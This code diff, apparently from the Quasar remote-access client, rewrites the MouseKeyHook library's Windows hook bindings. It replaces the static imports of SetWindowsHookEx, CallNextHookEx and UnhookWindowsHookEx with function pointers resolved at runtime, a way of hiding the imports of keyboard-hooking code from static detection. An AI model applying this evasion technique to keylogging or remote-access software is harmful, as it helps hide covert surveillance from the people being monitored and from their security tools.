@@ -2,6 +2,7 @@
 // Copyright (c) 2015 George Mamaladze
 // See license.txt or https://mit-license.org/
 
+using Quasar.Client.Utilities;
 using System;
 using System.Runtime.InteropServices;
 
@@ -21,13 +22,9 @@ namespace Gma.System.MouseKeyHook.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/windowing/hooks/hookreference/hookfunctions/setwindowshookex.asp
         /// </remarks>
-        [DllImport("user32.dll", CharSet = CharSet.Auto,
-            CallingConvention = CallingConvention.StdCall)]
-        internal static extern IntPtr CallNextHookEx(
-            IntPtr idHook,
-            int nCode,
-            IntPtr wParam,
-            IntPtr lParam);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        internal delegate IntPtr CallNextHookExProc(IntPtr idHook, int nCode, IntPtr wParam, IntPtr Param);
+        internal static IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam) => NativeMethods.GetProcAddress2<CallNextHookExProc>("user32.dll", "CallNextHookEx")(idHook, nCode, wParam, lParam);
 
         /// <summary>
         ///     The SetWindowsHookEx function installs an application-defined hook procedure into a hook chain.
@@ -59,13 +56,9 @@ namespace Gma.System.MouseKeyHook.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/windowing/hooks/hookreference/hookfunctions/setwindowshookex.asp
         /// </remarks>
-        [DllImport("user32.dll", CharSet = CharSet.Auto,
-            CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-        internal static extern HookProcedureHandle SetWindowsHookEx(
-            int idHook,
-            HookProcedure lpfn,
-            IntPtr hMod,
-            int dwThreadId);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal delegate HookProcedureHandle SetWindowsHookExProc(int idHook, HookProcedure lpfn, IntPtr hMod, int dwThreadId);
+        internal static HookProcedureHandle SetWindowsHookEx(int idHook, HookProcedure lpfn, IntPtr hMod, int dwThreadId) => NativeMethods.GetProcAddress2<SetWindowsHookExProc>("user32.dll", "SetWindowsHookEx")(idHook, lpfn, hMod, dwThreadId);
 
         /// <summary>
         ///     The UnhookWindowsHookEx function removes a hook procedure installed in a hook chain by the SetWindowsHookEx
@@ -82,8 +75,9 @@ namespace Gma.System.MouseKeyHook.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/windowing/hooks/hookreference/hookfunctions/setwindowshookex.asp
         /// </remarks>
-        [DllImport("user32.dll", CharSet = CharSet.Auto,
-            CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-        internal static extern int UnhookWindowsHookEx(IntPtr idHook);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal delegate int UnhookWindowsHookExProc(IntPtr idHook);
+        internal static int UnhookWindowsHookEx(IntPtr idHook) => NativeMethods.GetProcAddress2<UnhookWindowsHookExProc>("user32.dll", "UnhookWindowsHookEx")(idHook);
+
     }
 }
